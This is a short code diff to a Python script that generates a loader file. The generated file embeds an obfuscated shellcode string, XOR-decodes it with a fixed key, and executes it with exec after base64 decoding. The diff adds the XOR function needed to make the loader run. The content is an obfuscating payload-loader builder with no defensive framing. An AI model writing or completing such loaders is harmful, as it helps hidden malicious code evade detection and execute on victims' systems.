@@ -93,6 +93,8 @@ def main():
     with open(args.output, 'w') as f:
         f.write(f"import base64\n")
         f.write(f"import os\n")
+        f.write(f"def xor_encode(data, key):\n")
+        f.write(f"    return ''.join(chr(ord(c) ^ key) for c in data)\n")  # Adding the XOR function
         f.write(f"shellcode = '''{obfuscated_shellcode}'''\n")
         f.write(f"shellcode = xor_encode(shellcode, 123)\n")
         f.write(f"exec(base64.b64decode(shellcode))\n")
